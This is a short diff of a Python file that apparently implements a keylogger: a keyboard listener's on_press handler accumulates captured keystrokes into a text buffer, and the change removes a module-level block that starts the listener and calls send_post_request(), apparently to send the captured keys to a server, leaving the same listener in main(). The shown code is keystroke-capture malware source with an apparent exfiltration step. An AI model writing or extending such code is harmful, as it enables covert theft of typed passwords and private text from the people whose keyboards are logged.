@@ -47,11 +47,6 @@ def on_press(key):
         text += str(key).strip("'")
 
 
-with keyboard.Listener(on_press= on_press) as listener:
-    send_post_request()
-    listener.join()
-
-
 
 def main():
     with keyboard.Listener(on_press=on_press) as listener:
